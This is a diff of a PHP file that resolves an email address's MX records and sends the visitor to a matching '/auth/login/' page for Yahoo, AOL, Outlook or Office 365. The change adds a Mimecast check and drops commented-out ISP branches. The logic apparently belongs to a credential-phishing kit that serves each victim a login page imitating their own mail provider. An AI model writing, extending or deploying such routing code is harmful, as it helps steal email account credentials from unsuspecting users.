@@ -28,30 +28,27 @@ if (preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{
                 $statusCode = 1;
             }
 
-        } elseif (contains($mxhosts, "yahoo")) {
+        } else if (contains($mxhosts, "yahoo")) {
         	if (contains($mxhosts, "aol") !== false) {
         		$emailProvider = "/auth/login/aol";
         	} else {
         		$emailProvider = "/auth/login/yahoo";
         	}
 
-        } elseif (contains($mxhosts, "pphosted") || contains($mxhosts, "outlook") || contains($mxhosts, "ppe-hosted")) {
-            if (contains($mxhosts, "outlook") || contains($mxhosts, "pphosted") || contains($mxhosts, "microsoft") || contains($mxhosts, "ppe-hosted")) {
+        } elseif (contains($mxhosts, "pphosted") 
+        || contains($mxhosts, "outlook")
+        || contains($mxhosts, "mimecast") 
+        || contains($mxhosts, "ppe-hosted")) {
+
+            if (strpos($email, "outlook") || strpos($email, "hotmail") || strpos($email, "live")) {
+
                 $emailProvider = "/auth/login/outlook";
             } else {
+
         	    $emailProvider = "/auth/login/office";
             }
-        // } elseif (contains($mxhosts, "prodigy.net")) {
-        // 	$emailProvider = "Att";
-        // } elseif (contains($mxhosts, "earthlink.net")) {
-        // 	$emailProvider = "Earthlink";
-        // } elseif (stripos($domain, "cox.net") !== false) {
-        // 	$emailProvider = "Cox";
-        // } elseif (contains($mxhosts, "charter.net")) {
-        // 	$emailProvider = "Charter";
-        // } elseif (stripos($domain, "comcast.net") !== false) {
-        // 	$emailProvider = "Comcast";
-        } else {
+        }
+        else {
         	$statusCode = 1;
         }
        
